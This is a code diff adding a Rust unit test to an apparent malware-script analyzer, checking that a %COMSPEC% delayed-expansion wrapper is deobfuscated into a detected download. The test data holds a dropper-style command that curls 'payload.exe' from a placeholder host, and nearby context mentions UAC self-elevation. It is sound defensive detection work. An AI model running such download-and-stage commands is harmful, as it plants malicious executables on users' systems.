@@ -1828,6 +1828,24 @@ start payload.chm"#;
     }
 
     #[test]
+    fn comspec_cmd_child_preserves_delayed_expansion() {
+        let script = br#"%COMSPEC% /V:ON /c "set U=https://comspec-wrapper.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://comspec-wrapper.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "%COMSPEC% cmd child did not preserve delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn start_process_verb_runas_emits_self_elevation_trait() {
         // `Start-Process … -Verb RunAs` triggers UAC. Dropper families
         // (SKMBT, dropper.bat) use it to relaunch elevated. Surface as
